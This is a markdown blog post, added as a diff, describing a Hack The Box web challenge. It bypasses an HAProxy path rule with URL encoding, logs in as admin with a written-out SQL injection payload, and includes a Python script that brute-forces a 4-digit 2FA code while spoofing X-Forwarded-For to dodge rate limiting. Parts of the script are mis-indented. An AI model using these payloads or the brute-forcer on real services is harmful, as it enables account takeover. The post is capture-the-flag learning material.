@@ -1,0 +1,143 @@
+---
+title: 'Web challeng Write-Up: No-Threshold'
+date: '2023-12-17'
+tags: ['Web Exploitaion']
+draft: false
+summary: 'writeup detailing the solving process of the No-Threshold web challenge from HACK THE BOX.'
+---
+
+## Web Challenge from Hack The Box
+
+##### Challenge level:- Medium
+##### Challenge Description:
+Prepare for the finest magic products out there. However, please be aware that we've implemented a specialized protective spell within our web application to guard against any black magic aimed at our web shop.🔮🎩
+
+
+#### **Website:**
+
+Upon starting the challenge on HackTheBox, we are given a URL to visit furthermore, we are also given the source code of the vulnerable application to download.
+Upon visiting the web application, it became apparent that it functioned as an online shop where the ability to make purchases was restricted solely to logged-in users.
+
+![logged_only.png](/static/images/logged_only.png)
+
+navigating to the /auth/login page : 
+
+![forbidden_access.png](/static/images/forbidden_access.png)
+
+
+the response was   `403 Forbidden` indicating that  the request is forbidden by administrative rules.
+Examining the source code, particularly focusing on the HAProxy configuration file `haproxy.cfg`.
+
+![haproxyconfig.png](/static/images/haproxyconfig.png)
+  
+The `http-request deny if { path_beg /auth/login }` configuration in HAProxy is a directive that denies access to any HTTP request whose path begins with `/auth/login`.
+After numerous attempts to understand how to handle this restriction, I discovered that URL encoding was adequate for bypassing it.
+URL-encoding of `auth`=`%61%75%74%68`
+
+
+![urlencode.png](/static/images/urlencode.png)
+  
+Upon entering the login page, my subsequent action was to attempt to log in.
+Inspecting the code handling the login process:
+
+![444444444444444444444444.png](/static/images/444444444444444444444444.png)
+
+the `login` function uses the function `query_db` to query the database which takes a SQL  query as a parmeter.
+the SQL query used to retrieve a user seems to be vulnerable.Using this payload (`testsq' UNION ALL SELECT  username, password FROM users WHERE username = 'admin `) ,I was able to login as an admin.
+
+URL-Encoding(`testsq' UNION ALL SELECT  username, password FROM users WHERE username = 'admin `)==  `%74%65%73%74%73%71%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%20%75%73%65%72%6e%61%6d%65%2c%20%70%61%73%73%77%6f%72%64%20%46%52%4f%4d%20%75%73%65%72%73%20%57%48%45%52%45%20%75%73%65%72%6e%61%6d%65%20%3d%20%27%61%64%6d%69%6e`
+
+
+![elmoudir.png](/static/images/elmoudir.png)
+
+Once  getting logged , I was redirected to a 2fa code verification page.
+according to the login function ,once logged ,the function `set_2fa_code(4)` is called to  generate a random 4-digit Two-Factor Authentication (2FA)  code  and set it in the uwsgi cache valid for 5 minutes. 
+
+
+![2fa.png](/static/images/2fa.png)
+
+In this scenario, a viable solution could involve employing a brute-force attack, particularly since the target number is limited to a 4-digit length.
+While employing Burp Intruder (with attack mode: `sniper`) , the first few requests were successful, but the rest resulted in a 429 status error code.
+
+Upon revisiting the HAProxy configuration, I identified the cause.
+
+![429_statuscode.png](/static/images/429_statuscode.png)
+
+this HAProxy configuration assure if a client makes more than 20 requests in a short timeframe, they will be denied access with a 429 status code. 
+An important thing to mention is that the information used to identify clients is taken from the `X-Forwarded-For` header.
+
+That's why I wrote a python script that brute force the 2fa code and changing
+the `X-Forwarded-For` every 4 requests.
+
+```python
+import requests
+from concurrent.futures import ThreadPoolExecutor
+def load_wordlist(wordl):
+	with open(wordl,'r') as wor:
+	return wor.read().splitlines()
+	  
+def send_requests(codes_2fa,n):
+	url='http://188.166.175.58:30948/auth/verify-2fa'
+	headers={	
+	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',	
+	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+	'Accept-Language': 'en-US,en;q=0.5',	
+	'Accept-Encoding': 'gzip, deflate, br',	
+	'Content-Type': 'application/x-www-form-urlencoded',	
+	'Content-Length': '13',	
+	'Origin': 'http://188.166.175.58:30948',	
+	'Connection': 'close',	
+	'Referer': 'http://188.166.175.58:30948/auth/verify-2fa',	
+	'Upgrade-Insecure-Requests': '1',	
+	'Sec-Fetch-Dest': 'document',	
+	'Sec-Fetch-Mode': 'navigate',	
+	'Sec-Fetch-Site': 'same-origin',	
+	'Sec-Fetch-User': '?1',
+	}
+	
+	base_ip='192.168.'
+	current_ip_suffix=[1,1]	
+	with ThreadPoolExecutor(max_workers=100) as executor:
+		futures=[]	
+		for i,code_2fa in enumerate(codes_2fa,start=1):
+			ip=base_ip+str(current_ip_suffix[0])+'.'+str(current_ip_suffix[1])
+			future=executor.submit(send_request,ip,code_2fa,headers,url)
+			futures.append(future)		
+			if i% n ==0:
+				current_ip_suffix[1]+=1			
+			if current_ip_suffix[1]>254:
+				current_ip_suffix[1]=1
+				current_ip_suffix[0]+=1			
+			if current_ip_suffix[0]>254:
+				current_ip_suffix=[1,1]		
+		for future in futures:
+			future.result()
+			
+def send_request(ip,code_2fa,headers,url):
+	headers['X-Forwarded-For']=ip	
+	data={'2fa-code':str(code_2fa)}	
+	response=requests.post(url,headers=headers,data=data)
+	if 'Invalid 2FA Code!' not in response.text:	
+		print(f'IP :{ip},2FA:{code_2fa}:{response.text}')
+  
+
+if __name__=='__main__':
+my_wordlist='/home/lwess/Downloads/SecLists-master/Fuzzing/4-digits-0000-9999.txt'
+codes_2fa=load_wordlist(my_wordlist)
+n=4
+send_requests(codes_2fa,n)
+```
+
+
+Running this python script :
+
+
+![flag2.png](/static/images/flag2.png)
+
+# **Summary:**
+
+The `No-Threshold` web challenge presented by Hack The Box was an exceptional experience. This distinctive challenge centers on a misconfiguration in HAProxy that enables unauthorized access through URI encoding. The journey unfolds by gaining admin privileges through SQL injection exploitation and culminates in overcoming the 2FA-code check through a brute-force attack. Successfully solving the challenge requires chaining together all identified vulnerabilities to ultimately obtain the flag
+
+
+
+
